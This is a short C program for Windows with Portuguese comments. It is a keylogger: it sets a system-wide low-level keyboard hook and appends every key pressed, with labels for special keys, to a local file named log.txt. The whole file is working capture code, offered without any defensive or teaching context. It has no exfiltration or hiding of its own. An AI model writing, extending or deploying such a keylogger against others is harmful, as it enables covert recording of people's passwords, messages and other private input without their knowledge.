#include <stdio.h>
#include <windows.h>

HHOOK hook;  // Hook global
FILE *logFile;

// Mapeia teclas especiais para texto legível
const char* getSpecialKey(DWORD vkCode) {
    switch (vkCode) {
        case VK_RETURN: return "[ENTER]";
        case VK_BACK: return "[BACKSPACE]";
        case VK_TAB: return "[TAB]";
        case VK_SHIFT: return "[SHIFT]";
        case VK_CONTROL: return "[CTRL]";
        case VK_MENU: return "[ALT]";
        case VK_CAPITAL: return "[CAPS_LOCK]";
        case VK_ESCAPE: return "[ESC]";
        case VK_SPACE: return "[SPACE]";
        case VK_LEFT: return "[LEFT_ARROW]";
        case VK_RIGHT: return "[RIGHT_ARROW]";
        case VK_UP: return "[UP_ARROW]";
        case VK_DOWN: return "[DOWN_ARROW]";
        case VK_DELETE: return "[DEL]";
        default: return NULL;
    }
}

// Função chamada quando uma tecla for pressionada
LRESULT CALLBACK KeyLogger(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *key = (KBDLLHOOKSTRUCT *)lParam;
        logFile = fopen("log.txt", "a+");

        if (logFile != NULL) {
            const char *specialKey = getSpecialKey(key->vkCode);
            if (specialKey) {
                fprintf(logFile, "%s ", specialKey);
            } else {
                fprintf(logFile, "%c", key->vkCode);
            }
            fclose(logFile);
        }
    }
    return CallNextHookEx(hook, nCode, wParam, lParam);
}

// Configura o hook do teclado
void SetHook() {
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyLogger, GetModuleHandle(NULL), 0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

// Remove o hook ao fechar
void Unhook() {
    UnhookWindowsHookEx(hook);
}

int main() {
    SetHook();
    Unhook();
    return 0;
}
